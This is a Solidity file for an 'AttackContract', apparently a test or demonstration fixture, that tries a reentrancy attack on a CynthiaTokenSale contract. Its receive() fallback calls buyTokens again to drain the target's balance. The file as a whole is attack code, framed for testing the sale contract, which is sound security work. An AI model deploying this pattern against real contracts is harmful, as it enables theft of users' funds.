// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./CynthiaTokenSale.sol";

/**
 * @title AttackContract
 * @dev This contract demonstrates a potential reentrancy attack on the CynthiaTokenSale contract.
 * It's designed for educational purposes to showcase vulnerabilities in smart contracts.
 * WARNING: This contract is for testing and demonstration only. Do not use in production.
 */
contract AttackContract {
    /// @notice The target CynthiaTokenSale contract instance
    CynthiaTokenSale public tokenSale;

    /**
     * @dev Constructor that sets the target CynthiaTokenSale contract address
     * @param _tokenSale The address of the CynthiaTokenSale contract to attack
     */
    constructor(address _tokenSale) {
        tokenSale = CynthiaTokenSale(_tokenSale);
    }

    /**
     * @dev Initiates the attack by calling the buyTokens function of the target contract
     * @notice This function should be called with 1 ether to start the attack
     */
    function attack() external payable {
        tokenSale.buyTokens{value: 1 ether}();
    }

    /**
     * @dev Fallback function to handle incoming ether
     * @notice This function is called when ether is sent to the contract
     * It attempts to recursively call buyTokens if the target contract still has balance
     */
    receive() external payable {
        if (address(tokenSale).balance >= 1 ether) {
            tokenSale.buyTokens{value: 1 ether}();
        }
    }
}
